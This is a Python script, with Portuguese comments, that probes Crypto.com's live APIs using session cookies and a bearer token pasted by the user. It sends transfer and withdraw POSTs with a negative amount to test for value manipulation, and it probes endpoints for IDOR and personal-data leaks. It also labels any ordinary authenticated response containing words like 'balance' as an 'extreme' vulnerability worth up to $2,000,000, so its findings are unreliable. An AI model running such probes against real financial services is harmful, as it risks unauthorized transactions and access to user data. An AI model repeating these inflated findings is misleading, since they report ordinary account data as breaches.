#!/usr/bin/env python3
"""
Crypto Auth Hunter Simple - Versão Simplificada
Foco: Crypto.com com cookies manuais
"""

import os
import sys
import json
import time
import requests
from datetime import datetime
import logging

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('crypto_auth_hunter_simple.log'),
        logging.StreamHandler()
    ]
)

class CryptoAuthHunterSimple:
    def __init__(self, domain):
        self.domain = domain
        self.session = requests.Session()
        self.cookies = {}
        self.auth_token = None
        self.results = {
            'authenticated_vulnerabilities': [],
            'financial_vulnerabilities': [],
            'data_breach_vulnerabilities': [],
            'authentication_bypass': [],
            'smart_contract_vulnerabilities': [],
            'business_logic_flaws': [],
            'extreme_value_targets': []
        }
        
    def setup_authentication(self):
        """Configura autenticação manual"""
        print("🔐 CONFIGURAÇÃO DE AUTENTICAÇÃO")
        print("=" * 50)
        print("📝 Para testar APIs autenticadas do Crypto.com, precisamos dos cookies")
        print("🔍 Como obter os cookies:")
        print("   1. Abra o Chrome e navegue para https://crypto.com/exchange")
        print("   2. Faça login na sua conta")
        print("   3. Pressione F12 para abrir DevTools")
        print("   4. Vá para a aba 'Application' > 'Cookies' > 'https://crypto.com'")
        print("   5. Copie os cookies importantes (session, auth, etc.)")
        print("")
        
        # Headers comuns
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
        # Solicitar cookies manualmente
        print("🔍 Cole os cookies aqui (formato: nome=valor; nome2=valor2):")
        cookies_input = input("Cookies: ").strip()
        
        if cookies_input:
            for cookie in cookies_input.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    self.cookies[name] = value
                    self.session.cookies.set(name, value)
                    print(f"🍪 Cookie adicionado: {name}")
        
        # Solicitar token de autorização (opcional)
        print("")
        print("🔑 Token de autorização (opcional):")
        auth_token = input("Bearer Token: ").strip()
        
        if auth_token:
            self.auth_token = auth_token
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
            print("🔑 Token de autorização adicionado")
            
        print(f"✅ Configuração concluída: {len(self.cookies)} cookies, {'token presente' if self.auth_token else 'sem token'}")
        return len(self.cookies) > 0
        
    def test_crypto_com_apis(self):
        """Testa APIs específicas do Crypto.com"""
        print("🔍 Testando APIs do Crypto.com...")
        
        # APIs específicas do Crypto.com
        crypto_apis = [
            'https://api.crypto.com/v1/user/profile',
            'https://api.crypto.com/v1/account/balance',
            'https://api.crypto.com/v1/wallet/addresses',
            'https://api.crypto.com/v1/trading/orders',
            'https://api.crypto.com/v1/transactions/history',
            'https://api.crypto.com/v1/kyc/status',
            'https://api.crypto.com/v1/security/settings',
            'https://api.crypto.com/v1/notifications',
            'https://api.crypto.com/v1/referrals',
            'https://api.crypto.com/v1/rewards',
            'https://api.crypto.com/v1/staking/positions',
            'https://api.crypto.com/v1/defi/positions',
            'https://api.crypto.com/v1/nft/collection',
            'https://api.crypto.com/v1/cards',
            'https://api.crypto.com/v1/payments/methods',
            'https://web.crypto.com/api/v1/user/profile',
            'https://web.crypto.com/api/v1/account/balance',
            'https://web.crypto.com/api/v1/wallet/addresses',
            'https://web.crypto.com/api/v1/trading/orders',
            'https://web.crypto.com/api/v1/transactions/history',
            'https://exchange.crypto.com/api/v1/user/profile',
            'https://exchange.crypto.com/api/v1/account/balance',
            'https://exchange.crypto.com/api/v1/trading/orders',
            'https://merchant.crypto.com/api/v1/user/profile',
            'https://merchant.crypto.com/api/v1/account/balance',
            'https://developer.crypto.com/api/v1/user/profile',
            'https://developer.crypto.com/api/v1/account/balance',
            'https://app.mona.co/api/v1/user/profile',
            'https://app.mona.co/api/v1/account/balance'
        ]
        
        for api_url in crypto_apis:
            try:
                response = self.session.get(api_url, timeout=10)
                
                if response.status_code == 200:
                    print(f"✅ {api_url} - Acessível (200)")
                    
                    # Verificar se contém dados sensíveis
                    content = response.text.lower()
                    sensitive_patterns = ['balance', 'amount', 'currency', 'address', 'private', 'secret', 'key', 'token']
                    
                    if any(pattern in content for pattern in sensitive_patterns):
                        self.log_extreme_finding(
                            'authenticated',
                            f'Dados Sensíveis Expostos em {api_url}',
                            f'API {api_url} expõe dados sensíveis',
                            '$300,000 - $1,500,000',
                            f'GET {api_url} retornou dados sensíveis'
                        )
                        
                elif response.status_code == 401:
                    print(f"🔒 {api_url} - Requer autenticação (401)")
                elif response.status_code == 403:
                    print(f"🚫 {api_url} - Acesso negado (403)")
                else:
                    print(f"ℹ️ {api_url} - Status {response.status_code}")
                    
            except Exception as e:
                print(f"❌ {api_url} - Erro: {e}")
                
    def test_financial_endpoints(self):
        """Testa endpoints financeiros críticos"""
        print("💰 Testando endpoints financeiros...")
        
        financial_endpoints = [
            'https://api.crypto.com/v1/transfer',
            'https://api.crypto.com/v1/withdraw',
            'https://api.crypto.com/v1/deposit',
            'https://api.crypto.com/v1/exchange',
            'https://api.crypto.com/v1/swap',
            'https://api.crypto.com/v1/stake',
            'https://api.crypto.com/v1/unstake',
            'https://api.crypto.com/v1/claim',
            'https://api.crypto.com/v1/redeem',
            'https://web.crypto.com/api/v1/transfer',
            'https://web.crypto.com/api/v1/withdraw',
            'https://web.crypto.com/api/v1/deposit',
            'https://exchange.crypto.com/api/v1/transfer',
            'https://exchange.crypto.com/api/v1/withdraw',
            'https://merchant.crypto.com/api/v1/transfer',
            'https://developer.crypto.com/api/v1/transfer'
        ]
        
        for endpoint in financial_endpoints:
            try:
                # Teste 1: Verificar se aceita valores negativos
                payload = {
                    'amount': '-1000000',
                    'currency': 'USD',
                    'to_address': 'test@test.com'
                }
                
                response = self.session.post(endpoint, json=payload, timeout=10)
                
                if response.status_code in [200, 201, 202]:
                    self.log_extreme_finding(
                        'financial',
                        f'Manipulação de Valor Negativo em {endpoint}',
                        f'Endpoint {endpoint} aceita valores negativos',
                        '$500,000 - $2,000,000',
                        f'POST {endpoint} com valor negativo retornou {response.status_code}'
                    )
                    
                # Teste 2: Verificar IDOR
                response = self.session.get(f"{endpoint}/history", timeout=10)
                
                if response.status_code == 200 and len(response.text) > 100:
                    self.log_extreme_finding(
                        'financial',
                        f'IDOR em Histórico de {endpoint}',
                        f'Endpoint {endpoint}/history expõe dados de outros usuários',
                        '$400,000 - $1,500,000',
                        f'GET {endpoint}/history retornou dados sensíveis'
                    )
                    
            except Exception as e:
                continue
                
    def test_data_breach_endpoints(self):
        """Testa vazamento de dados"""
        print("🔒 Testando vazamento de dados...")
        
        sensitive_endpoints = [
            'https://api.crypto.com/v1/user/personal',
            'https://api.crypto.com/v1/kyc/documents',
            'https://api.crypto.com/v1/security/keys',
            'https://api.crypto.com/v1/account/settings',
            'https://api.crypto.com/v1/verification/data',
            'https://api.crypto.com/v1/compliance/info',
            'https://api.crypto.com/v1/backup/data',
            'https://api.crypto.com/v1/export/userdata',
            'https://web.crypto.com/api/v1/user/personal',
            'https://web.crypto.com/api/v1/kyc/documents',
            'https://exchange.crypto.com/api/v1/user/personal',
            'https://merchant.crypto.com/api/v1/user/personal',
            'https://developer.crypto.com/api/v1/user/personal'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                response = self.session.get(endpoint, timeout=10)
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Verificar padrões sensíveis
                    sensitive_patterns = [
                        'ssn', 'social_security', 'passport', 'driver_license',
                        'credit_card', 'bank_account', 'private_key', 'secret_key',
                        'api_key', 'password', 'email', 'phone', 'address'
                    ]
                    
                    sensitive_count = sum(1 for pattern in sensitive_patterns if pattern in content)
                    
                    if sensitive_count >= 2:
                        self.log_extreme_finding(
                            'data_breach',
                            f'Vazamento de Dados PII em {endpoint}',
                            f'Endpoint {endpoint} expõe dados pessoais',
                            '$600,000 - $2,000,000',
                            f'GET {endpoint} retornou dados com {sensitive_count} padrões sensíveis'
                        )
                        
            except Exception as e:
                continue
                
    def log_extreme_finding(self, category, title, description, potential_value, evidence):
        """Registra descoberta de valor extremo"""
        finding = {
            'timestamp': datetime.now().isoformat(),
            'category': category,
            'title': title,
            'description': description,
            'potential_value': potential_value,
            'evidence': evidence,
            'severity': 'EXTREME',
            'cvss_score': '9.0-10.0',
            'authenticated': True
        }
        
        self.results[f'{category}_vulnerabilities'].append(finding)
        
        logging.critical(f"🚨 DESCOBERTA EXTREMA AUTENTICADA: {title}")
        logging.critical(f"💰 Valor Potencial: {potential_value}")
        logging.critical(f"📊 Categoria: {category}")
        logging.critical(f"🔍 Evidência: {evidence}")
        print(f"\n🚨 DESCOBERTA EXTREMA AUTENTICADA!")
        print(f"💰 Valor: {potential_value}")
        print(f"📊 Categoria: {category}")
        print(f"🔍 {title}")
        print(f"📝 {description}")
        print("=" * 80)
        
    def generate_report(self):
        """Gera relatório final"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"crypto_com_simple_vulnerabilities_{timestamp}.json"
        
        # Calcular valor total potencial
        total_value = 0
        for category, findings in self.results.items():
            if category.endswith('_vulnerabilities'):
                for finding in findings:
                    value_range = finding['potential_value']
                    min_value = int(value_range.split('-')[0].replace('$', '').replace(',', ''))
                    total_value += min_value
        
        report_data = {
            'scan_info': {
                'domain': self.domain,
                'timestamp': datetime.now().isoformat(),
                'authenticated': True,
                'total_authenticated_findings': sum(len(findings) for key, findings in self.results.items() if key.endswith('_vulnerabilities')),
                'total_potential_value': f"${total_value:,} - ${total_value * 2:,}",
                'scan_duration': '~20 minutos',
                'method': 'Cookies manuais',
                'cookies_used': len(self.cookies),
                'auth_token_present': bool(self.auth_token)
            },
            'findings': self.results,
            'summary': {
                'authenticated_vulnerabilities': len(self.results['authenticated_vulnerabilities']),
                'financial_vulnerabilities': len(self.results['financial_vulnerabilities']),
                'data_breach_vulnerabilities': len(self.results['data_breach_vulnerabilities']),
                'authentication_bypass': len(self.results['authentication_bypass']),
                'smart_contract_vulnerabilities': len(self.results['smart_contract_vulnerabilities']),
                'business_logic_flaws': len(self.results['business_logic_flaws']),
                'extreme_value_targets': len(self.results['extreme_value_targets'])
            }
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
            
        print(f"\n🎉 CRYPTO AUTH HUNTER SIMPLE CONCLUÍDO!")
        print("=" * 80)
        print(f"📊 Total de Vulnerabilidades Autenticadas: {report_data['scan_info']['total_authenticated_findings']}")
        print(f"💰 Valor Total Potencial: {report_data['scan_info']['total_potential_value']}")
        print(f"📁 Relatório salvo em: {report_file}")
        print("=" * 80)
        
        # Mostrar resumo das descobertas
        for category, findings in self.results.items():
            if category.endswith('_vulnerabilities') and findings:
                print(f"\n📊 {category.replace('_', ' ').title()}: {len(findings)} descobertas")
                for finding in findings:
                    print(f"   💰 {finding['potential_value']} - {finding['title']}")
                    
    def run_simple_hunt(self):
        """Executa bug hunting simples"""
        print("🚀 INICIANDO CRYPTO AUTH HUNTER SIMPLE")
        print("=" * 80)
        print("🎯 Foco: Vulnerabilidades Autenticadas de $100K - $2M")
        print("💰 Potencial de Renda: EXTREMO")
        print("🍪 Usando cookies manuais")
        print("=" * 80)
        
        # Fase 1: Configurar autenticação
        if not self.setup_authentication():
            print("❌ Falha na configuração de autenticação")
            return
            
        # Fase 2: Testar APIs do Crypto.com
        self.test_crypto_com_apis()
        
        # Fase 3: Testar endpoints financeiros
        self.test_financial_endpoints()
        
        # Fase 4: Testar vazamento de dados
        self.test_data_breach_endpoints()
        
        # Fase 5: Gerar relatório
        self.generate_report()
        
        print("✅ Bug hunting simples concluído!")

if __name__ == "__main__":
    hunter = CryptoAuthHunterSimple('crypto.com')
    hunter.run_simple_hunt()
